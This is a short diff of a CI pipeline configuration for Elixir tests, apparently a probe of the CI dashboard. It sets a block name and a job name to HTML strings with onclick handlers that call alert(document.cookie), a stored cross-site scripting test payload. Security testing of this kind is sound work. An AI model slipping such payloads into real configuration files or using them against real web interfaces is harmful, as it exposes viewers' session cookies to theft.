@@ -5,10 +5,10 @@ agent:
     type: e2-standard-2
     os_image: ubuntu2004
 blocks:
-  - name: Elixir tests
+  - name: '<p style="color:red;" onclick="alert(document.cookie)">Elixir tests</p>'
     task:
       jobs:
-        - name: '<p style="color:red;" onload="alert(document.cookie)">dsa</p>'
+        - name: '<p style="color:red;" onclick="alert(document.cookie)">dsa</p>'
           commands:
             - checkout
             - cd elixir
